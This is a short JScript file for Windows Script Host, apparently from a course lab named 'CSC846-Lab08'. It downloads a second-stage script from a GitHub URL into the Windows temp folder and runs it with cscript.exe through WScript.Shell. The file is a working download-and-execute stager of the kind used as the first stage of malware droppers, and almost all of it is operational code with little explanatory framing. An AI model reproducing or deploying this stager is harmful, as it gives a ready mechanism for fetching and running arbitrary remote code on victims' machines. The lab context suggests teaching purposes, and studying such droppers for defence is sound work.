// This functionality only works in a trusted Windows Script Host environment (e.g., .hta, .js file run by cscript.exe)
// and is highly discouraged in a web browser due to security vulnerabilities.

// write_debug: Used to show debugging output.
function write_debug(str_to_write) {
    if(debug) { // Switch is below
        try{
            console.log(str_to_write); // In IE, console only works if devtools is open.
        } catch(e) {
            try {
                alert(str_to_write); // A lot of popups but provides information.
            } catch(e) {
                // Otherwise, nothing.
            }
        }
    }
}

var debug = true; // Whether write_debug will do anything.

var remoteUrl = "https://github.com/kwafula/kwafula.github.io/raw/refs/heads/main/CSC846-Lab08/local_stage1.js";
var fso = new ActiveXObject("Scripting.FileSystemObject");
var tempFolder = fso.GetSpecialFolder(2);
//var localPath = path.join(tempFolder, 'stage1.js'); // Path to save the file, path.join() not supported in browser
var localPath = tempFolder + "\\" + "stage1.js"; // Path to save the file
try {
    // Stage 1 Step 1: Download the script content
    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
    xhr.open("GET", remoteUrl, false); // Synchronous request
    xhr.send();
    if (xhr.status === 200) {
        var stage1Content = xhr.responseText;
        // Stage 1 Step 2: Save the content to a local file
        var fso = new ActiveXObject("Scripting.FileSystemObject");
        var file = fso.CreateTextFile(localPath, true);
        file.Write(stage1Content);
        file.Close();
        // Stage 1 Step 3: Execute the local file using cscript.exe
        var shell = new ActiveXObject("WScript.Shell");
        // The command line to run cscript on the downloaded file
        var cscriptCommand = "cscript.exe //NoLogo \"" + localPath + "\"";
        // var command = shell.Run(cscriptCommand, 1, true); // Run and wait for it to complete
        shell.Run(cscriptCommand, 1, true); // Run and wait for it to complete
        write_debug("Script executed successfully.");
    } else {
        write_debug("Failed to download script. Status: " + xhr.status);
    }
} catch (e) {
    write_debug("An error occurred: " + e.message);
}
